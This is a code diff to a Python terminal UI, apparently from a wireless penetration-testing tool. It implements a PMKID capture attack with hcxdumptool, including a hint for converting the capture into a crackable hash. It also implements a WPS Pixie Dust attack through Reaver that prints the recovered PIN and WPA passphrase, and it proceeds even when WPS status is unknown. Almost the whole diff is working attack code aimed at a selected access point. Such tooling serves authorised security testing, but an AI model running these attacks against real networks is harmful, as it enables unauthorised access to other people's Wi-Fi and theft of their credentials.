@@ -675,21 +675,147 @@ class WirelessScreen(Screen):
 
     async def _pmkid_attack(self) -> None:
         """Perform PMKID attack using hcxdumptool."""
-        self._write_output("[yellow]PMKID attack not yet implemented[/]")
-        # TODO: Implement using hcxdumptool
-
-    async def _wps_attack(self) -> None:
-        """Perform WPS attack."""
         if not self._selected_network:
             self._write_output("[red]No network selected[/]")
             return
 
-        if not self._selected_network.wps:
-            self._write_output("[red]Selected network does not have WPS enabled[/]")
+        selector = self.query_one("#interface-selector", InterfaceSelector)
+        select = selector.query_one("#interface-select", Select)
+
+        if not select.value:
+            self._write_output("[red]No interface selected[/]")
             return
 
-        self._write_output("[yellow]WPS attack not yet implemented[/]")
-        # TODO: Implement using reaver/bully
+        interface = str(select.value)
+        network = self._selected_network
+
+        self._write_output(f"[cyan]Starting PMKID attack on {network.essid} ({network.bssid})...[/]")
+
+        try:
+            import shutil
+            import tempfile
+            from pathlib import Path
+
+            # Check for hcxdumptool
+            if not shutil.which("hcxdumptool"):
+                self._write_output("[red]hcxdumptool not found. Install with: apt install hcxdumptool[/]")
+                return
+
+            # Create output file
+            output_dir = Path(tempfile.gettempdir()) / "voidwave"
+            output_dir.mkdir(exist_ok=True)
+            output_file = output_dir / f"pmkid_{network.bssid.replace(':', '')}.pcapng"
+
+            self._write_output(f"[dim]Capturing PMKID to {output_file}...[/]")
+
+            # Run hcxdumptool for PMKID capture
+            proc = await asyncio.create_subprocess_exec(
+                "hcxdumptool",
+                "-i", interface,
+                "-o", str(output_file),
+                "--filterlist_ap", network.bssid,
+                "--filtermode", "2",
+                "--enable_status", "1",
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.STDOUT,
+            )
+
+            # Run for 30 seconds or until PMKID captured
+            try:
+                async def read_output():
+                    pmkid_found = False
+                    while True:
+                        line = await proc.stdout.readline()
+                        if not line:
+                            break
+                        decoded = line.decode().strip()
+                        if decoded:
+                            self._write_output(f"[dim]{decoded}[/]")
+                            if "PMKID" in decoded.upper():
+                                self._write_output("[green]PMKID captured![/]")
+                                pmkid_found = True
+                    return pmkid_found
+
+                captured = await asyncio.wait_for(read_output(), timeout=30)
+
+                if captured:
+                    self._write_output(f"[green]PMKID saved to {output_file}[/]")
+                    self._write_output("[cyan]Convert with: hcxpcapngtool -o hash.22000 " + str(output_file) + "[/]")
+                else:
+                    self._write_output("[yellow]Capture timeout - PMKID may not have been captured[/]")
+                    self._write_output(f"[dim]Check {output_file} anyway[/]")
+
+            except asyncio.TimeoutError:
+                self._write_output("[yellow]Capture timeout - checking for PMKID...[/]")
+                self._write_output(f"[dim]Output saved to {output_file}[/]")
+            finally:
+                proc.terminate()
+                try:
+                    await asyncio.wait_for(proc.wait(), timeout=5)
+                except asyncio.TimeoutError:
+                    proc.kill()
+
+        except Exception as e:
+            self._write_output(f"[red]PMKID attack error: {e}[/]")
+
+    async def _wps_attack(self) -> None:
+        """Perform WPS attack using Reaver."""
+        if not self._selected_network:
+            self._write_output("[red]No network selected[/]")
+            return
+
+        selector = self.query_one("#interface-selector", InterfaceSelector)
+        select = selector.query_one("#interface-select", Select)
+
+        if not select.value:
+            self._write_output("[red]No interface selected[/]")
+            return
+
+        interface = str(select.value)
+        network = self._selected_network
+
+        # Check WPS status
+        if not network.wps:
+            self._write_output("[yellow]WPS status unknown - attempting attack anyway[/]")
+
+        if network.wps_locked:
+            self._write_output("[red]Warning: WPS appears to be locked on this AP[/]")
+
+        self._write_output(f"[cyan]Starting WPS attack on {network.essid} ({network.bssid})...[/]")
+        self._write_output("[dim]Using Pixie Dust attack (fast) - falls back to brute force if needed[/]")
+
+        try:
+            from voidwave.tools.reaver import ReaverTool
+
+            tool = ReaverTool()
+            await tool.initialize()
+
+            # First try Pixie Dust (fast attack)
+            self._write_output("[yellow]Attempting Pixie Dust attack...[/]")
+
+            result = await tool.wps_attack(
+                bssid=network.bssid,
+                interface=interface,
+                channel=network.channel,
+                pixiedust=True,
+                essid=network.essid if network.essid else None,
+            )
+
+            if result.get("pin"):
+                self._write_output(f"[green]WPS PIN found: {result['pin']}[/]")
+                if result.get("psk"):
+                    self._write_output(f"[green]WPA PSK: {result['psk']}[/]")
+                self.app.notify(f"WPS cracked! PIN: {result['pin']}", severity="information")
+            elif result.get("locked"):
+                self._write_output("[red]AP has rate limiting enabled - attack blocked[/]")
+            else:
+                self._write_output("[yellow]Pixie Dust failed - AP may not be vulnerable[/]")
+                if result.get("errors"):
+                    for err in result["errors"][:3]:  # Show first 3 errors
+                        self._write_output(f"[dim]{err}[/]")
+
+        except Exception as e:
+            self._write_output(f"[red]WPS attack error: {e}[/]")
 
     def action_start_scan(self) -> None:
         """Start scan action."""
